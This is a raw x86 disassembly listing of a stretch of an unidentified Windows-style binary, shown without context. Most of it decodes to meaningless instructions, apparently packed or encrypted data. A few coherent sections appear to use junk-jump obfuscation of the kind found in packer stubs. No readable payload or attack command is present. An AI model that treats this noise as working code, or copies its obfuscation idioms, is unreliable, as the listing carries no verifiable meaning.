  407be9:	and    al,0x8d
  407beb:	pop    esp
  407bec:	js     0x407be5
  407bee:	push   esi
  407bef:	out    0x99,al
  407bf1:	xchg   edx,eax
  407bf2:	(bad)  
  407bf3:	xchg   edx,eax
  407bf4:	sbb    DWORD PTR [eax-0x3],esi
  407bf7:	pop    ecx
  407bf8:	pop    edi
  407bf9:	cwde   
  407bfa:	or     edx,DWORD PTR [ebp-0x2b285d2d]
  407c00:	mov    edx,0x37335f6
  407c05:	outs   dx,BYTE PTR ds:[esi]
  407c06:	std    
  407c07:	cld    
  407c08:	sbb    al,BYTE PTR [ebx-0x7c78e5e2]
  407c0e:	push   0x1c
  407c10:	ss xor bl,bl
  407c13:	pop    edx
  407c14:	in     al,0xef
  407c16:	pop    ebp
  407c17:	arpl   sp,si
  407c19:	mov    ebx,0xc68a3662
  407c1e:	adc    al,0xd8
  407c20:	pop    esi
  407c21:	enter  0xc216,0xce
  407c25:	(bad)  
  407c26:	fdivp  st(6),st
  407c28:	cmp    esi,DWORD PTR [eax-0x5d]
  407c2b:	imul   ebx,DWORD PTR [ecx],0xc6df9853
  407c31:	scas   eax,DWORD PTR es:[edi]
  407c32:	(bad)  
  407c33:	hlt    
  407c34:	imul   edi,DWORD PTR [eax],0xb518f245
  407c3a:	int    0x35
  407c3c:	mov    esi,0xd436d966
  407c41:	add    al,BYTE PTR [edi]
  407c43:	or     BYTE PTR [edx-0x3f5fdbf8],bh
  407c49:	jmp    0x2447:0x35577029
  407c50:	arpl   ax,cx
  407c52:	cdq    
  407c53:	ja     0x407c66
  407c55:	adc    esi,ebx
  407c57:	jge    0x407c3b
  407c59:	adc    BYTE PTR ds:0xe16c6aaf,ah
  407c5f:	scas   al,BYTE PTR es:[edi]
  407c60:	pop    ss
  407c61:	inc    ecx
  407c62:	inc    ebp
  407c63:	dec    edi
  407c64:	fmul   DWORD PTR [eax+0x55d9c6d1]
  407c6a:	inc    ebx
  407c6b:	lock call 0x9878af86
  407c71:	imul   edi,DWORD PTR [ecx+eiz*1+0x7b],0x754e169e
  407c79:	and    ah,BYTE PTR [edx+0x60e5c567]
  407c7f:	xchg   DWORD PTR [ebp-0x1b],ecx
  407c82:	xor    BYTE PTR [ebx-0x38],0xed
  407c86:	mov    dh,0x68
  407c88:	std    
  407c89:	mov    eax,ds:0xca5d7229
  407c8e:	sbb    eax,0xdc6ee591
  407c93:	mov    bl,0xa9
  407c95:	cmp    bh,bl
  407c97:	inc    ecx
  407c98:	out    dx,al
  407c99:	scas   al,BYTE PTR es:[edi]
  407c9a:	fld    QWORD PTR [edx+0x2b]
  407c9d:	adc    dh,BYTE PTR [esi]
  407c9f:	jmp    0x6606ee8a
  407ca4:	add    eax,0xab98a260
  407ca9:	(bad)  
  407cab:	frstor [ebx+0x37]
  407cae:	stos   DWORD PTR es:[edi],eax
  407caf:	adc    DWORD PTR [ebx],ebp
  407cb1:	mov    edi,0xc3e60819
  407cb6:	jl     0x407c89
  407cb8:	fistp  DWORD PTR [edi+0x20fa6bf1]
  407cbe:	int    0x9a
  407cc0:	iret   
  407cc1:	test   eax,0xc5da573
  407cc6:	inc    edx
  407cc7:	adc    DWORD PTR [ebp-0x2a77a475],esi
  407ccd:	rcr    BYTE PTR [ebx-0x7],cl
  407cd0:	sti    
  407cd1:	(bad)  
  407cd3:	sti    
  407cd4:	lock or DWORD PTR [ecx+0x4b5ff7e5],0xffffff95
  407cdc:	adc    al,0x31
  407cde:	push   ecx
  407cdf:	xchg   edx,eax
  407ce0:	mov    ch,0x42
  407ce2:	test   bh,bl
  407ce4:	or     ecx,esp
  407ce6:	shl    BYTE PTR [edx-0x70f2615a],1
  407cec:	jecxz  0x407d54
  407cee:	jmp    0xa9e01404
  407cf3:	fdiv   DWORD PTR [esi-0x4495a74b]
  407cf9:	aaa    
  407cfa:	mov    esp,0x64ab6b1f
  407cff:	loop   0x407c94
  407d01:	test   ebp,0xd93a1482
  407d07:	mov    esp,cs
  407d09:	push   es
  407d0a:	sti    
  407d0b:	cmp    edx,ebx
  407d0d:	aaa    
  407d0e:	xchg   ebx,eax
  407d0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d10:	push   ebp
  407d11:	dec    ecx
  407d12:	mov    ch,0xff
  407d14:	sub    al,0xf5
  407d16:	aaa    
  407d17:	push   edx
  407d18:	hlt    
  407d19:	adc    eax,0xeb2473d0
  407d1e:	out    dx,eax
  407d1f:	xchg   esi,eax
  407d20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d21:	xchg   ah,dl
  407d23:	mov    bh,0xa5
  407d25:	add    eax,0xaf78c0ec
  407d2a:	xchg   ecx,eax
  407d2b:	jae    0x407d91
  407d2d:	xchg   ecx,eax
  407d2e:	inc    esi
  407d2f:	mov    edx,0xcea32588
  407d34:	fsub   DWORD PTR [edx-0xf]
  407d37:	cmp    DWORD PTR ds:[ebp-0xe],edi
  407d3b:	mov    ds:0xa54645eb,eax
  407d40:	out    dx,al
  407d41:	push   edx
  407d42:	dec    edi
  407d43:	jne    0x407da5
  407d45:	cmp    DWORD PTR [di],ebp
  407d48:	and    bl,BYTE PTR [ecx]
  407d4a:	call   0xf2e96c07
  407d4f:	cmp    ah,ch
  407d51:	adc    BYTE PTR [edi],cl
  407d53:	inc    ecx
  407d54:	pextrw edi,(bad),0xc5
  407d56:	cmp    esi,DWORD PTR [ebx-0x1f]
  407d59:	jg     0x407d68
  407d5b:	inc    edi
  407d5c:	add    ebx,ecx
  407d5e:	mov    esi,fs
  407d60:	xor    BYTE PTR [ecx-0x3f],dl
  407d63:	pop    edx
  407d64:	jmp    0xc9600ca9
  407d69:	cwde   
  407d6a:	lea    esi,[ebx+0x24dd8090]
  407d70:	cwde   
  407d71:	or     DWORD PTR [edi],0x4f
  407d74:	out    dx,eax
  407d75:	jmp    0x407d0a
  407d77:	clc    
  407d78:	int3   
  407d79:	cmp    eax,0xcb0240e8
  407d7e:	push   esp
  407d7f:	mov    ds:0x280e969b,al
  407d84:	jecxz  0x407df3
  407d86:	sti    
  407d87:	sub    al,0x73
  407d89:	stc    
  407d8a:	sbb    ch,BYTE PTR [ecx-0x62daf0a4]
  407d90:	lock or esp,DWORD PTR [ecx+ebp*8-0x70dbe0c0]
  407d98:	stos   DWORD PTR es:[edi],eax
  407d99:	fsub   QWORD PTR [edi-0x784d9a3a]
  407d9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407da0:	add    BYTE PTR [esp+ecx*1-0x5ee0bc8a],bh
  407da7:	ins    DWORD PTR es:[edi],dx
  407da8:	pop    ebp
  407da9:	xchg   esp,eax
  407daa:	push   cs
  407dab:	in     eax,dx
  407dac:	xchg   dh,dl
  407dae:	dec    edx
  407daf:	cs and al,0x1
  407db2:	and    al,BYTE PTR [ebp+esi*2+0x70816e48]
  407db9:	mov    eax,fs:0x11595b6d
  407dbf:	cs inc ecx
  407dc1:	push   0x2a
  407dc3:	gs loopne 0x407dc0
  407dc6:	xchg   ebx,ebp
  407dc8:	or     DWORD PTR [edx-0xc],0xfffffff6
  407dcc:	mov    WORD PTR [ecx],ss
  407dce:	dec    esi
  407dcf:	sub    al,ch
  407dd1:	lds    ecx,FWORD PTR [eax]
  407dd3:	in     al,dx
  407dd4:	out    0xbf,al
  407dd6:	push   esi
  407dd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407dd8:	lods   al,BYTE PTR ds:[esi]
  407dd9:	ror    DWORD PTR [edx+ebp*2],cl
  407ddc:	pop    ss
  407ddd:	add    ch,ah
  407ddf:	add    eax,0x5fe71005
  407de4:	pusha  
  407de5:	jl     0x407da7
  407de7:	pop    esi
  407de8:	ret    
  407de9:	and    edi,edx
  407deb:	xchg   esi,eax
  407dec:	in     al,dx
  407ded:	xor    al,0xa8
  407def:	out    dx,al
  407df0:	cmc    
  407df1:	rep ins DWORD PTR es:[edi],dx
  407df3:	leave  
  407df4:	pop    ebx
  407df5:	es push eax
  407df7:	loope  0x407e2c
  407df9:	iret   
  407dfa:	popf   
  407dfb:	int    0x62
  407dfd:	retf   
  407dfe:	inc    edi
  407dff:	or     eax,0xfafce3db
  407e04:	cmp    cl,BYTE PTR [edx]
  407e06:	pop    ss
  407e07:	inc    esi
  407e08:	mov    DWORD PTR [eax],edx
  407e0a:	push   esi
  407e0b:	stc    
  407e0c:	rol    ebx,1
  407e0e:	sbb    BYTE PTR [ecx+0x73],0xdb
  407e12:	mov    ecx,0x9ab9dd4d
  407e17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e18:	inc    ebp
  407e19:	mov    cl,0x37
  407e1b:	push   ecx
  407e1c:	dec    ebx
  407e1d:	mov    ebp,0xdc9c042d
  407e22:	data16 sub bh,dl
  407e25:	cmc    
  407e26:	cmp    al,0xc0
  407e28:	call   0xa5fd:0x6682be42
  407e2f:	sbb    eax,0xd613573c
  407e34:	xor    al,0x5e
  407e36:	test   ebx,ecx
  407e38:	push   edi
  407e39:	outs   dx,BYTE PTR ds:[esi]
  407e3a:	dec    edx
  407e3b:	mov    bh,0x33
  407e3d:	stc    
  407e3e:	es dec esi
  407e40:	fbld   TBYTE PTR [esi+eax*2]
  407e43:	shl    DWORD PTR [esi+0x26f7ad43],0x39
  407e4a:	imul   ebx,DWORD PTR [ecx],0xacf828d6
  407e50:	fist   DWORD PTR [ecx+eax*1+0x39]
  407e54:	(bad)  
  407e56:	mov    cl,0x1
  407e58:	mov    ch,0x63
  407e5a:	dec    esp
  407e5b:	and    ebx,0xffffffa4
  407e5e:	adc    dl,BYTE PTR [ebp-0xc]
  407e61:	call   0xa122172c
  407e66:	fnstcw WORD PTR [eax+0x10]
  407e69:	ja     0x407e03
  407e6b:	dec    ebx
  407e6c:	xor    DWORD PTR [ebp+ebx*1-0x3c],esi
  407e70:	ret    0x9018
  407e73:	nop
  407e74:	enter  0x73f2,0xa9
  407e78:	jge    0x407e07
  407e7a:	push   edx
  407e7b:	fadd   DWORD PTR [ecx+0x7198cda8]
  407e81:	sub    dl,0x71
  407e84:	jmp    0x65ab:0x437996
  407e8b:	lea    ecx,ss:[ebx+0x1346ff4d]
  407e92:	adc    BYTE PTR [eax+0x23],dh
  407e95:	jo     0x407e7a
  407e97:	xor    esp,DWORD PTR [eax-0x1c]
  407e9a:	cmp    DWORD PTR [edi+0x57],ebx
  407e9d:	pop    eax
  407e9e:	outs   dx,BYTE PTR ds:[esi]
  407e9f:	nop
  407ea0:	mov    ch,0xa2
  407ea2:	inc    esp
  407ea3:	jne    0x407ee5
  407ea5:	ss dec ecx
  407ea7:	mov    bl,0x3b
  407ea9:	add    BYTE PTR [ebx],0xd8
  407eac:	fnsave [edx-0x5c6cc266]
  407eb2:	dec    eax
  407eb3:	xor    ebp,edx
  407eb5:	or     cl,BYTE PTR [esi]
  407eb7:	pop    esi
  407eb8:	call   0x217ecb31
  407ebd:	pop    es
  407ebe:	ret    
  407ebf:	adc    al,0x6b
  407ec1:	in     eax,0x2e
  407ec3:	iret   
  407ec4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ec5:	and    esi,DWORD PTR ss:[esi-0x45518116]
  407ecc:	mov    eax,ds:0x5a703563
  407ed1:	sub    BYTE PTR [eax],dh
  407ed3:	cwde   
  407ed4:	mov    cl,0x83
  407ed6:	jae    0x407f41
  407ed8:	sub    DWORD PTR [ebx-0x4df67c78],0x81d8a9ec
  407ee2:	jne    0x407ee0
  407ee4:	mov    eax,0x660e149e
  407ee9:	mov    eax,DWORD PTR [ebp-0x8]
  407eec:	push   DWORD PTR [ebp+0x8]
  407eef:	call   0x407f00
  407ef4:	test   eax,eax
  407ef6:	je     0x407ee1
  407efc:	leave  
  407efd:	ret    0x4
  407f00:	push   ebp
  407f01:	mov    ebp,esp
  407f03:	sub    esp,0x2c
  407f06:	or     DWORD PTR ds:0x43366f,edi
  407f0c:	jmp    0x408093
  407f11:	outs   dx,DWORD PTR ds:[esi]
  407f12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f13:	ins    BYTE PTR es:[edi],dx
  407f14:	inc    edi
  407f15:	jne    0x407f6c
  407f17:	jne    0x407ecf
  407f19:	push   ss
  407f1a:	push   ds
  407f1b:	mov    ch,0xcc
  407f1d:	xchg   esp,eax
  407f1e:	dec    esi
  407f1f:	rol    BYTE PTR [esi+0x7e7ed62a],1
  407f25:	in     al,0x7f
  407f27:	jle    0x407fa7
  407f29:	les    ebx,FWORD PTR [ebx]
  407f2b:	xlat   BYTE PTR ds:[ebx]
  407f2c:	(bad)  
  407f2d:	out    dx,al
  407f2e:	pushf  
  407f2f:	repz cmp eax,0xc13b6f0
  407f35:	xchg   ebx,eax
  407f36:	fs aas 
  407f38:	repnz pop ds
  407f3a:	add    dh,al
  407f3c:	(bad)  [edx+esi*4-0x48840d66]
  407f43:	retf   0xfcf3
  407f46:	xor    ecx,DWORD PTR [edx]
  407f48:	jns    0x407f9c
  407f4a:	adc    ebp,DWORD PTR fs:[ecx-0x4e]
  407f4e:	xchg   edi,eax
  407f4f:	leave  
  407f50:	lea    ebx,[esi-0x52df92c1]
  407f56:	cmc    
  407f57:	ja     0x407fd1
  407f59:	loop   0x407f6e
  407f5b:	mov    dl,0x25
  407f5d:	mov    dl,0x7f
  407f5f:	push   ds
  407f60:	push   ebx
  407f61:	std    
  407f62:	and    BYTE PTR [esi+0x2b74ed3c],ch
  407f68:	or     esi,DWORD PTR [ebx-0xb]
  407f6b:	xchg   esi,eax
  407f6c:	js     0x407f0d
  407f6e:	out    dx,eax
  407f6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f70:	out    0xae,al
  407f72:	push   edi
  407f73:	into   
  407f74:	jnp    0x407f0e
  407f76:	and    ebp,0xbfc766d8
  407f7c:	ins    BYTE PTR es:[edi],dx
  407f7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f7e:	jae    0x407f53
  407f80:	aaa    
  407f81:	imul   ecx,DWORD PTR [esi-0x1f07bb66],0xc7ecc239
  407f8b:	push   DWORD PTR [eax-0x5e]
  407f8e:	jp     0x407f78
  407f90:	outs   dx,BYTE PTR ds:[esi]
  407f91:	cmc    
  407f92:	xchg   ebx,eax
  407f93:	lea    edi,[edi]
  407f95:	shl    DWORD PTR [eax-0x72426620],0x33
  407f9c:	xor    al,0xc9
  407f9e:	stc    
  407f9f:	mov    ah,0xd1
  407fa1:	jnp    0x407ff9
  407fa3:	(bad)  
  407fa4:	push   esi
  407fa5:	vcmppd xmm0,xmm0,XMMWORD PTR [ecx],0x97
  407faa:	xor    ebp,DWORD PTR [esi-0x539caff0]
  407fb0:	and    eax,0x7b415b35
  407fb5:	add    eax,0xae2623
  407fba:	push   edx
  407fbb:	mov    esp,0x4c192799
  407fc0:	pop    ecx
  407fc1:	mov    ebx,0x456dd250
  407fc6:	mov    dh,0x71
  407fc8:	jnp    0x407fad
  407fca:	pop    ecx
  407fcb:	out    0x9f,al
  407fcd:	les    esi,FWORD PTR [edi+0x688b0e08]
  407fd3:	iret   
  407fd4:	jle    0x408022
  407fd6:	leave  
  407fd7:	int    0x9a
  407fd9:	aam    0x36
  407fdb:	cmp    BYTE PTR cs:[edi],cl
  407fde:	mov    esp,0xd8a61bb6
  407fe3:	or     DWORD PTR [ecx-0x60],0x77
  407fe7:	cli    
  407fe8:	aam    0x91
  407fea:	adc    BYTE PTR [edi-0x49cc9c6c],ah
  407ff0:	pop    eax
  407ff1:	icebp  
  407ff2:	iret   
  407ff3:	mov    al,ds:0xd6fa274a
  407ff8:	sahf   
  407ff9:	daa    
  407ffa:	and    BYTE PTR [eax-0x1c],bl
  407ffd:	out    0xed,eax
  407fff:	push   edi
  408000:	xchg   ebp,eax
  408001:	rep lods al,BYTE PTR ds:[esi]
  408003:	push   ss
  408004:	inc    ebx
  408005:	mov    cl,0x2e
  408007:	xchg   ebx,eax
  408008:	xor    dh,BYTE PTR [edi+eax*1]
  40800b:	cmc    
  40800c:	(bad)  
  40800d:	adc    bl,BYTE PTR [esi-0x4a]
  408010:	(bad)  
  408011:	rol    DWORD PTR [eax-0x6b],cl
  408014:	mov    ecx,0x18309ae0
  408019:	popa   
  40801a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40801b:	jns    0x407fff
  40801d:	push   eax
  40801e:	xor    BYTE PTR [edx+ecx*4],bl
  408021:	shl    ecx,1
  408023:	test   BYTE PTR [ecx+0x6644a87e],ch
  408029:	bound  esp,QWORD PTR [ebx]
  40802b:	cdq    
  40802c:	cwde   
  40802d:	push   es
  40802e:	in     al,dx
  40802f:	sbb    al,0x27
  408031:	in     al,dx
  408032:	xchg   ebx,eax
  408033:	dec    ebx
  408034:	fdiv   QWORD PTR [ecx+0x49539ca6]
  40803a:	(bad)  
  40803b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40803c:	push   ecx
  40803d:	or     eax,0x760c0966
  408042:	dec    ebp
  408043:	sti    
  408044:	xchg   edx,eax
  408045:	or     bl,BYTE PTR [edx+0x6c3317c5]
  40804b:	pop    ecx
  40804c:	cli    
  40804d:	into   
  40804e:	fistp  DWORD PTR [esp+edi*8]
  408051:	test   eax,0x83ad1223
  408056:	imul   edi
  408058:	in     eax,dx
  408059:	pop    ecx
  40805a:	push   ds
  40805b:	cwde   
  40805c:	in     eax,dx
  40805d:	cld    
  40805e:	test   eax,0x3335392a
  408063:	xchg   ebp,eax
  408064:	out    0xc7,al
  408066:	jl     0x408008
  408068:	aam    0x78
  40806a:	sbb    DWORD PTR [edi-0x3c],ebx
  40806d:	popa   
  40806e:	and    eax,0xfd1dc962
  408073:	std    
  408074:	inc    ebx
  408075:	add    al,0x60
  408077:	sbb    ch,bh
  408079:	imul   ebp,DWORD PTR [edi-0x54],0x28e3815b
  408080:	cwde   
  408081:	jbe    0x4080ed
  408083:	sbb    ecx,0x9aa2e260
  408089:	fcom   DWORD PTR [ebp-0x5a]
  40808c:	shr    BYTE PTR [esi-0x80],1
  40808f:	hlt    
  408090:	dec    ebx
  408091:	adc    al,0xaa
  408093:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40809a:	inc    ecx
  40809b:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4080a2:	mov    eax,0x9577
  4080a7:	mov    ecx,DWORD PTR ds:0x433627
  4080ad:	xor    DWORD PTR ds:0x433733,ecx
  4080b3:	mov    WORD PTR [ebp-0x4],ax
  4080b7:	inc    DWORD PTR ds:0x433737
  4080bd:	lea    eax,[ebp-0x24]
  4080c0:	mov    DWORD PTR [ebp-0x28],eax
  4080c3:	sbb    ecx,0x45b9
  4080c9:	mov    eax,DWORD PTR [ebp+0x8]
  4080cc:	mov    DWORD PTR [ebp-0x20],eax
  4080cf:	push   ebx
  4080d0:	movzx  ecx,WORD PTR ds:0x4336fb
  4080d7:	add    ecx,DWORD PTR ds:0x43361b
  4080dd:	mov    DWORD PTR ds:0x4336fb,ecx
  4080e3:	lea    eax,[ebp-0x18]
  4080e6:	mov    DWORD PTR [ebp-0x1c],eax
  4080e9:	mov    eax,DWORD PTR [ebp-0x1c]
  4080ec:	and    DWORD PTR ds:0x433667,edx
  4080f2:	push   esi
  4080f3:	or     DWORD PTR ds:0x433683,ebx
  4080f9:	push   edi
  4080fa:	add    DWORD PTR ds:0x43361f,ebx
  408100:	mov    edi,0xf89f2da9
  408105:	mov    DWORD PTR [eax],edi
  408107:	and    DWORD PTR ds:0x4336b3,0x0
  408111:	jmp    0x408121
  408116:	mov    eax,ds:0x4336b3
  40811b:	inc    eax
  40811c:	mov    ds:0x4336b3,eax
  408121:	cmp    DWORD PTR ds:0x4336b3,0x11
  408128:	jae    0x408163
  40812e:	cmp    DWORD PTR ds:0x4336b3,0x4
  408135:	jne    0x408146
  40813b:	push   0x1543
  408140:	call   DWORD PTR ds:0x412390
  408146:	cmp    DWORD PTR ds:0x4336b3,0x3
  40814d:	jne    0x40815e
  408153:	mov    eax,ds:0x4336b3
  408158:	inc    eax
  408159:	mov    ds:0x4336b3,eax
  40815e:	jmp    0x408116
  408163:	mov    eax,DWORD PTR [ebp-0x14]
  408166:	mov    ebx,DWORD PTR [ebp-0x8]
  408169:	mov    ecx,0x7510854
  40816e:	mov    DWORD PTR ds:0x43366b,0x500e
  408178:	jmp    0x4082ff
  40817d:	xor    dl,BYTE PTR [esi+0x23]
  408180:	inc    edi
  408181:	arpl   WORD PTR [ebx+0x72],si
  408184:	jae    0x408123
  408186:	aas    
  408187:	or     eax,0xbce2228b
  40818c:	pop    ebx
  40818d:	nop
  40818e:	xlat   BYTE PTR ds:[ebx]
  40818f:	jle    0x40820f
  408191:	in     al,0x7f
  408193:	jle    0x408213
  408195:	(bad)  
  408196:	js     0x40812d
  408198:	xor    al,0x1e
  40819a:	mov    dl,0xf9
  40819c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40819d:	lds    edi,FWORD PTR [edi+0x2d]
  4081a0:	imul   esi,DWORD PTR [ebp-0x76],0x6722815a
  4081a7:	xchg   ebp,eax
  4081a8:	fs sahf 
  4081aa:	push   esp
  4081ab:	xchg   ecx,eax
  4081ac:	adc    bh,BYTE PTR [eax-0x498a8770]
  4081b2:	pop    ebx
  4081b3:	inc    esi
  4081b4:	(bad)  
  4081b5:	sti    
  4081b6:	imul   edx,ebp,0x31
  4081b9:	sbb    edx,DWORD PTR [ebp-0x75]
  4081bc:	sub    eax,0x9ea47bfe
  4081c1:	sub    edx,ecx
  4081c3:	ds cli 
  4081c5:	les    esp,FWORD PTR [ebp+0x5acdf663]
  4081cb:	les    edi,FWORD PTR [eax]
  4081cd:	jns    0x4081a3
  4081cf:	test   al,0xb3
  4081d1:	gs in  al,dx
  4081d3:	and    eax,0xa6fe2c43
  4081d8:	cmp    BYTE PTR [eax],dl
  4081da:	rcr    BYTE PTR [esi+0x51],0x5d
  4081de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081df:	dec    ecx
  4081e0:	cdq    
  4081e1:	pop    ds
  4081e2:	lahf   
  4081e3:	mov    ebx,0xa7c7c232
  4081e8:	adc    DWORD PTR gs:[edi+0x450a36dd],0x73
  4081f0:	xchg   edx,eax
  4081f1:	(bad)  
  4081f2:	stos   DWORD PTR es:[edi],eax
  4081f3:	fs aam 0x39
  4081f6:	push   eax
  4081f7:	jle    0x408233
  4081f9:	dec    ebx
  4081fa:	jecxz  0x4081c1
  4081fc:	mov    al,0xa1
  4081fe:	inc    eax
  4081ff:	cs pop es
  408201:	popa   
  408202:	cdq    
  408203:	ret    
  408204:	dec    esi
  408205:	add    edx,DWORD PTR [edi-0x553d23d4]
  40820b:	mov    esi,DWORD PTR [eax-0xd]
  40820e:	ins    DWORD PTR es:[edi],dx
  40820f:	push   cs
  408210:	or     dl,BYTE PTR [edx+0x4a51adce]
  408216:	and    BYTE PTR [eax],bl
  408218:	mov    esp,0x13d4538d
  40821d:	xchg   edx,eax
  40821e:	sbb    eax,0x9db2b57e
  408223:	xor    BYTE PTR [esi+0x5c],cl
  408226:	hlt    
  408227:	xor    bl,BYTE PTR [ebx-0xaed1dc3]
  40822d:	inc    eax
  40822e:	mov    BYTE PTR [ecx+0x3d],dh
  408231:	sbb    esi,ebp
  408233:	cmc    
  408234:	clc    
  408235:	xor    esi,DWORD PTR [eax+0x66]
  408238:	add    BYTE PTR [eax+0x53],bl
  40823b:	or     cl,0xfb
  40823e:	and    ecx,DWORD PTR [edi+0xe]
  408241:	inc    esp
  408242:	mov    al,0x24
  408244:	dec    edi
  408245:	sbb    eax,0x60436540
  40824a:	out    0xc3,eax
  40824c:	and    dh,BYTE PTR [edi+0x7690352c]
  408252:	enter  0x8520,0x9d
  408256:	jmp    0x2c71:0xfd2637b0
  40825d:	call   0x663a:0xddc0e190
  408264:	add    BYTE PTR [eax+eiz*4],ch
  408267:	jp     0x408206
  408269:	repnz adc eax,0x93dd8f5
  40826f:	shr    edi,0x1c
  408272:	scas   eax,DWORD PTR es:[edi]
  408273:	cmp    eax,0x82e251a0
  408278:	std    
  408279:	das    
  40827a:	fist   DWORD PTR [eax+eiz*2+0x66d84da0]
  408281:	retf   
  408282:	mov    dl,0xdf
  408284:	mov    al,ds:0x4eb3cc91
  408289:	inc    BYTE PTR [edi-0x52750e6f]
  40828f:	scas   al,BYTE PTR es:[edi]
  408290:	adc    DWORD PTR ds:0xb2ef5e11,edx
  408296:	aam    0x59
  408298:	(bad)  
  408299:	cli    
  40829a:	or     al,0xd2
  40829c:	mov    ebp,0x912f9d16
  4082a1:	and    ecx,DWORD PTR [ecx]
  4082a3:	xor    ebx,DWORD PTR [ebx]
  4082a5:	arpl   WORD PTR [edi+0x479313b7],di
  4082ab:	mov    esi,0xe8f9e7
  4082b0:	jl     0x408282
  4082b2:	lods   al,BYTE PTR ds:[esi]
  4082b3:	gs lahf 
  4082b5:	xchg   edx,eax
  4082b6:	test   DWORD PTR [ebx+0x501a8103],esp
  4082bc:	pop    ebp
  4082bd:	mov    cl,0xe
  4082bf:	(bad)  [edx+0x6]
  4082c2:	fmulp  st(5),st
  4082c4:	sub    BYTE PTR [edi],bh
  4082c6:	push   0x51
  4082c8:	imul   esp,DWORD PTR [esi+0x615bdaf0],0x4b713947
  4082d2:	pop    edx
  4082d3:	ror    BYTE PTR [eax],0xc3
  4082d6:	test   BYTE PTR [ebp-0x55ad51f2],bl
  4082dc:	retf   0x8d23
  4082df:	sbb    al,0xcd
  4082e1:	jnp    0x408271
  4082e3:	pop    ebx
  4082e4:	loope  0x4082e0
  4082e6:	outs   dx,DWORD PTR ds:[esi]
  4082e7:	xor    ah,BYTE PTR [edx]
  4082e9:	div    DWORD PTR [ebx+0x3ecdcfc4]
  4082ef:	cmp    cl,BYTE PTR [esi]
  4082f1:	repz pop edi
  4082f3:	mov    dl,0xca
  4082f5:	fisub  DWORD PTR [edi+0x7ebe6c9a]
  4082fb:	aad    0x82
  4082fd:	xchg   ecx,eax
  4082fe:	inc    edi
  4082ff:	xor    eax,ecx
  408301:	and    DWORD PTR ds:0x43367f,0x1370
  40830b:	mov    esi,0x32729b
  408310:	add    DWORD PTR ds:0x433623,0x35ec
  40831a:	xor    ebx,ecx
  40831c:	xor    DWORD PTR ds:0x4336af,0x433743
  408326:	xor    edx,edx
  408328:	add    DWORD PTR ds:0x4336bf,0x300c
  408332:	add    eax,esi
  408334:	add    ebx,esi
  408336:	div    ebx
  408338:	mov    DWORD PTR ds:0x43367b,0x2005
  408342:	mov    edx,DWORD PTR [ebp-0x20]
  408345:	mov    DWORD PTR ds:0x43361b,0x2cd7
  40834f:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  408356:	mov    DWORD PTR ds:0x4336ff,0x77f0
  408360:	cmp    eax,DWORD PTR [edx]
  408362:	mov    DWORD PTR ds:0x433673,0x5769
  40836c:	jmp    0x4084f3
  408371:	or     ebx,ecx
  408373:	add    DWORD PTR [ecx+eax*8],ecx
  408376:	aam    0x11
  408378:	retf   
  408379:	imul   esp,edx,0xffffffd8
  40837c:	mov    eax,0x4026eb67
  408381:	push   es
  408382:	aad    0x7e
  408384:	jle    0x40836a
  408386:	jg     0x408406
  408388:	jle    0x4083d8
  40838a:	aas    
  40838b:	imul   ebp,DWORD PTR [ebx-0x67],0x2b
  40838f:	in     eax,0x28
  408391:	pop    edx
  408392:	sbb    BYTE PTR [edi-0x619ed43f],0x20
  408399:	out    0xcd,al
  40839b:	jp     0x408406
  40839d:	out    dx,al
  40839e:	xor    BYTE PTR [edx+0x7200ca8f],al
  4083a4:	sahf   
  4083a5:	cld    
  4083a6:	outs   dx,BYTE PTR ds:[esi]
  4083a7:	test   al,0xda
  4083a9:	cmp    cl,ah
  4083ab:	(bad)  
  4083ac:	pop    esi
  4083ad:	xor    BYTE PTR [ecx+edi*8],0x7
  4083b1:	fcom   DWORD PTR [ecx]
  4083b3:	xchg   ebx,eax
  4083b4:	daa    
  4083b5:	dec    esp
  4083b6:	adc    dl,al
  4083b8:	sahf   
  4083b9:	pop    es
  4083ba:	pop    ecx
  4083bb:	(bad)  
  4083bc:	outs   dx,BYTE PTR ds:[esi]
  4083bd:	shl    DWORD PTR [bp-0x4],1
  4083c1:	rcl    esp,0xbc
  4083c4:	retf   
  4083c5:	or     bh,ch
  4083c7:	xchg   esp,eax
  4083c8:	mov    ch,BYTE PTR [edx-0x15]
  4083cb:	es pop ecx
  4083cd:	xchg   DWORD PTR [ebx],eax
  4083cf:	cdq    
  4083d0:	fmulp  st(7),st
  4083d2:	sub    BYTE PTR [ebx-0x2a],0x67
  4083d6:	fucomi st,st(3)
  4083d8:	add    ebp,edx
  4083da:	int3   
  4083db:	mov    esp,0x5e2a1089
  4083e0:	repnz dec edi
  4083e2:	frstor [ebp-0x59]
  4083e5:	in     al,0x86
  4083e7:	pop    esp
  4083e8:	sub    DWORD PTR [ebx-0x42e229d6],edi
  4083ee:	ins    BYTE PTR es:[edi],dx
  4083ef:	push   eax
  4083f0:	fs (bad) 
  4083f2:	aad    0xa1
  4083f4:	pop    ebp
  4083f5:	xchg   edi,eax
  4083f6:	xor    DWORD PTR [eax-0x7],0xffffff96
  4083fa:	mov    ds,WORD PTR [ecx+0xfec9e2e]
  408400:	pop    es
  408401:	leave  
  408402:	rcr    BYTE PTR [esi-0x6f],1
  408405:	iret   
  408406:	ins    BYTE PTR es:[edi],dx
  408407:	loopne 0x4083c7
  408409:	test   DWORD PTR [eax+0x71874e1e],ecx
  40840f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408410:	and    esi,edi
  408412:	add    al,0x29
  408414:	rcr    DWORD PTR [esi-0x78],cl
  408417:	pop    esp
